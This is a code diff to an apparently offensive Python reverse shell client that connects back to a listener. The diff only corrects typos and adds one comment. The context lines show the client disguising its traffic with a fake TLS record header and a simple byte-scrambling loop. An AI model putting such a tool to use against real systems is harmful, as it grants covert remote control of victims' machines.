@@ -20,6 +20,7 @@ def encodePacket(data):
     """
     tlsHeader = bytes([0x17,0x03,0x01])
     length = len(data)
+    #Encryption Loop
     random.seed(length)
     temp = []
     for d in data:
@@ -34,7 +35,7 @@ def receivePacket(sock):
 
     @param sock  The socket descriptor to read from.
 
-    @return  The raw data recieved from the client, sans header.
+    @return  The raw data received from the client, sans header.
     """
     data = bytearray() 
     headIn = sock.recv(5)
@@ -51,7 +52,7 @@ def receivePacket(sock):
 
 
 def run(ip, port):
-    """! This function runs the client in an infinite loop until the exit command is recieved.
+    """! This function runs the client in an infinite loop until the exit command is received.
 
     @param ip  The IP address of the server to connect to.
 
@@ -67,7 +68,7 @@ def run(ip, port):
         print("CONNECTION ERROR")
         exit(0)
     print("CONNECTED")
-    #Send any data to initiallize connection. 
+    #Send any data to initialize connection. 
     sock.send(encodePacket("hello".encode()))
 
     while True:
@@ -91,7 +92,7 @@ def run(ip, port):
 # Sets this file up to be run by the command line. 
 #
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description='Start a reverse shell to connect to listiner.',
+    parser = argparse.ArgumentParser(description='Start a reverse shell to connect to listener.',
                                  usage="\n"
                                        "%(prog)s [IP] [PORT]"
                                        "\nUse '%(prog)s -h' for more information.")
